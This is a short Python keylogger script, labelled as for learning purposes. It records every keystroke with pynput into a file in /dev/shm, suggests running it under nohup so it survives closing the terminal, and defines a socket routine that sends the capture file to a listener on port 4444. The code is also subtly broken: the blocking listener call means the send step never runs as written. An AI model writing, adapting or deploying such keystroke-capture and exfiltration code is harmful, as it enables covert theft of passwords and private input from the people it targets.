#author alienX
#purpose learning purpose
#language: python3
#nohup python3 keylogger.py & ( this enable the keylogger script to continue running at the background even when the terminal is closed)

#import lib
import socket
from pynput.keyboard import Key, Listener   # you can to install the pynput library (pip install pyniput)
import logging                              # allows the keystrokes recorded being saved into the file (capture.txt)

logging.basicConfig(filename=("/dev/shm/capture.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
  logging.info(str(key))

with Listener(on_press=on_press) as listener :
  listener.join()

def send_file(filename, server_address, server_port):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        client_socket.connect((server_address, server_port))
        
        # file to send
        with open(filename, 'rb') as file:
            file_data = file.read()
        
        # Send the file data
        client_socket.sendall(file_data)
        print("File sent successfully!")
        
    except Exception as e:
        print("An error occurred:", e)
    
    finally:
        # socket closed here
        client_socket.close()

# server address and port
server_address = "127.0.0.1"
server_port = 4444

# Specify the filename to send
filename = "/dev/shm/capture.txt"

# Call the function to send the file
send_file(filename, server_address, server_port)
